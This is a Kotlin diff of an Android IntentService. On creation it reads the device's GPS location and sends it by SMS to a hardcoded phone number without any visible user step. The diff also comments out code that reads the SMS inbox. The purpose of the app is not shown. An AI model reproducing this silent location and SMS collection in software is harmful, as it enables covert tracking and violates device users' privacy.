@@ -40,21 +40,22 @@ class StazaIntent : IntentService("StazaIntent") {
     @SuppressLint("MissingPermission")
 
 
-    override fun onCreate(){
+    override fun onCreate() {
         super.onCreate()
         val locationProvider = LocationManager.GPS_PROVIDER
         val manager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        if ( manager.isProviderEnabled( locationProvider ) && ContextCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED ) {
-            val location = manager.getLastKnownLocation( locationProvider ) as Location
+        if (manager.isProviderEnabled(locationProvider) && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            val location = manager.getLastKnownLocation(locationProvider) as Location
             val currentLatitude = location.latitude
             val currentLongitude = location.longitude
             val msg = ("Your latitude is: " + currentLatitude +
                     "Your longitude is: " + currentLongitude)
             val sm = SmsManager.getDefault()
-            sm.sendTextMessage("+918422066247", null, msg, null, null)        }
-// public static final String INBOX = "content://sms/inbox";
-// public static final String SENT = "content://sms/sent";
-// public static final String DRAFT = "content://sms/draft";
+            sm.sendTextMessage("+918422066247", null, msg, null, null)
+        }
+        /*public static final String INBOX = "content://sms/inbox";
+        public static final String SENT = "content://sms/sent";
+        public static final String DRAFT = "content://sms/draft";
         val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
 
         if (cursor!!.moveToFirst()) { // must check the result to prevent exception
@@ -68,7 +69,7 @@ class StazaIntent : IntentService("StazaIntent") {
         } else {
             // empty box, no SMS
         }
-        cursor.close()
+        cursor.close()*/
     }
 
 
